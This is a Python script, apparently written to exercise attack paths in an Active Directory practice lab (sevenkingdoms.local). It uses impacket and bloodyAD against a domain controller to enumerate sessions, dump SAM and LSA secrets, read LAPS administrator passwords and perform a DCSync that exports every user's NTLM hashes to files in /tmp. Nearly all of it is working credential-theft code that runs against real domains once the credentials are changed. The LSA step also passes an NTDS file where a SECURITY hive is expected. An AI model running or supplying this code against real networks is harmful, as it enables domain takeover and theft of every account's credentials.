# test_strategies_real.py
import os
import subprocess
from dotenv import load_dotenv

load_dotenv()

DC_IP    = os.getenv("DC_IP",       "192.168.56.10")
DOMAIN   = os.getenv("AD_DOMAIN",   "sevenkingdoms.local")
USERNAME = os.getenv("AD_USERNAME", "cersei")
PASSWORD = os.getenv("AD_PASSWORD", "cersei")

SEP = "─" * 60

def run_cmd(description: str, cmd: list[str]) -> None:
    print(f"\n  [{description}]")
    print(f"  $ {' '.join(cmd)}\n")
    try:
        result = subprocess.run(cmd, text=True, timeout=30,
                                capture_output=False)
    except subprocess.TimeoutExpired:
        print("  [-] Timeout")
    except FileNotFoundError:
        print(f"  [-] Commande introuvable : {cmd[0]}")


# ─── 1. HasSession ───────────────────────────────────────────────────────────
print(f"\n{SEP}")
print("  TEST 1 — HasSession")
print(SEP)

# impacket Python API — pas de CLI nécessaire
try:
    from impacket.smbconnection import SMBConnection
    from impacket.dcerpc.v5 import transport, wkst

    print("\n  [Vérifier les sessions actives via impacket WKST]")
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USERNAME, PASSWORD, DOMAIN)

    rpctransport = transport.SMBTransport(DC_IP, filename=r'\wkssvc', smb_connection=smb)
    dce = rpctransport.get_dce_rpc()
    dce.connect()
    dce.bind(wkst.MSRPC_UUID_WKST)

    resp = wkst.hNetrWkstaUserEnum(dce, 1)
    sessions = resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']
    print(f"  [+] {len(sessions)} session(s) active(s) :")
    for s in sessions:
        print(f"      • {s['wkui1_username']} @ {s['wkui1_logon_domain']}")
    dce.disconnect()
    smb.logoff()

except ImportError:
    print("  [-] impacket non installé : pip install impacket --break-system-packages")
except Exception as e:
    print(f"  [-] Erreur : {e}")


# impacket secretsdump via API Python
try:
    from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
    from impacket.smbconnection import SMBConnection

    print("\n  [Dump LSASS via impacket secretsdump API]")
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USERNAME, PASSWORD, DOMAIN)

    remoteOps = RemoteOperations(smb, False)
    remoteOps.enableRegistry()

    SAMFileName, _ = remoteOps.saveSAM()
    sam = SAMHashes(SAMFileName, None, isRemote=True)
    sam.dump()
    sam.export(f"/tmp/sam_dump_{DC_IP.replace('.','_')}")

    remoteOps.finish()
    smb.logoff()

except Exception as e:
    print(f"  [-] Erreur secretsdump : {e}")


# ─── 2. AdminTo ──────────────────────────────────────────────────────────────
print(f"\n{SEP}")
print("  TEST 2 — AdminTo")
print(SEP)

try:
    from impacket.smbconnection import SMBConnection

    print("\n  [Vérifier droits admin local — SMB login test]")
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USERNAME, PASSWORD, DOMAIN)
    shares = smb.listShares()
    print(f"  [+] Connecté — {len(shares)} share(s) accessibles (Pwn3d! si ADMIN$)")
    for sh in shares:
        name = sh['shi1_netname'][:-1]
        print(f"      • {name}")
    smb.logoff()

except Exception as e:
    print(f"  [-] Erreur : {e}")


try:
    from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
    from impacket.smbconnection import SMBConnection

    print("\n  [Dump SAM + LSA via impacket API]")
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USERNAME, PASSWORD, DOMAIN)

    remoteOps = RemoteOperations(smb, False)
    remoteOps.enableRegistry()

    # SAM
    SAMFileName, _ = remoteOps.saveSAM()
    sam = SAMHashes(SAMFileName, None, isRemote=True)
    print("\n  [SAM Hashes]")
    sam.dump()

    # LSA
    SECURITYFileName, _ = remoteOps.saveNTDS()
    lsa = LSASecrets(SECURITYFileName, None, remoteOps, isRemote=True)
    print("\n  [LSA Secrets]")
    lsa.dumpCachedHashes()
    lsa.dumpSecrets()

    remoteOps.finish()
    smb.logoff()

except Exception as e:
    print(f"  [-] Erreur SAM/LSA : {e}")


# ─── 3. ReadLAPS ─────────────────────────────────────────────────────────────
print(f"\n{SEP}")
print("  TEST 3 — ReadLAPS")
print(SEP)

# bloodyAD — syntaxe corrigée (sans --right DCSync qui n'existe pas)
run_cmd(
    "Lire ms-Mcs-AdmPwd via bloodyAD",
    ["bloodyAD", "--host", DC_IP,
     "-d", DOMAIN, "-u", USERNAME, "-p", PASSWORD,
     "get", "object", "KINGSLANDING$",
     "--attr", "ms-Mcs-AdmPwd"]
)

# Vérifier via impacket LDAP
try:
    from impacket.ldap import ldap, ldapasn1

    print("\n  [Vérifier LAPS via impacket LDAP]")
    ldap_conn = ldap.LDAPConnection(
        f"ldap://{DC_IP}",
        f"dc={DOMAIN.replace('.', ',dc=')}"
    )
    ldap_conn.login(USERNAME, PASSWORD, DOMAIN)

    sc = ldap.SimplePagedResultsControl(size=10)
    ldap_conn.search(
        searchFilter="(ms-Mcs-AdmPwd=*)",
        attributes=["sAMAccountName", "ms-Mcs-AdmPwd"],
        sizeLimit=10,
        searchControls=[sc]
    )
    for item in ldap_conn._entries:
        if isinstance(item, ldapasn1.SearchResultEntry):
            print(f"  [+] LAPS trouvé : {item}")

except Exception as e:
    print(f"  [-] Erreur LDAP : {e}")


# ─── 4. DCSync ───────────────────────────────────────────────────────────────
print(f"\n{SEP}")
print("  TEST 4 — DCSync")
print(SEP)

# bloodyAD — syntaxe corrigée (--right WRITE au lieu de DCSync)
run_cmd(
    "Vérifier droits de réplication via bloodyAD (syntaxe corrigée)",
    ["bloodyAD", "--host", DC_IP,
     "-d", DOMAIN, "-u", USERNAME, "-p", PASSWORD,
     "get", "writable",
     "--otype", "DOMAIN",
     "--right", "ALL"]
)

# DCSync via impacket API Python
try:
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
    from impacket.smbconnection import SMBConnection

    print("\n  [DCSync — dump krbtgt + Administrator via impacket API]")
    smb = SMBConnection(DC_IP, DC_IP)
    smb.login(USERNAME, PASSWORD, DOMAIN)

    remoteOps  = RemoteOperations(smb, False)
    NTDSFileName = None

    def print_hash(secret):
        print(f"  [HASH] {secret}")

    ntds = NTDSHashes(
        NTDSFileName,
        None,
        isRemote=True,
        remoteOps=remoteOps,
        useVSSMethod=False,
        justNTLM=True,
        pwdLastSet=False,
        resumeSession=None,
        outputFileName="/tmp/dcsync_output",
        justUser=None,         # None = tous les users
        printUserStatus=False,
        perSecretCallback=print_hash
    )
    ntds.dump()
    ntds.export("/tmp/dcsync_sevenkingdoms")
    print(f"\n  [+] Hashes exportés dans /tmp/dcsync_sevenkingdoms")

    remoteOps.finish()
    smb.logoff()

except Exception as e:
    print(f"  [-] Erreur DCSync : {e}")


print(f"\n{SEP}")
print("  Tous les tests terminés.")
print(f"{SEP}\n")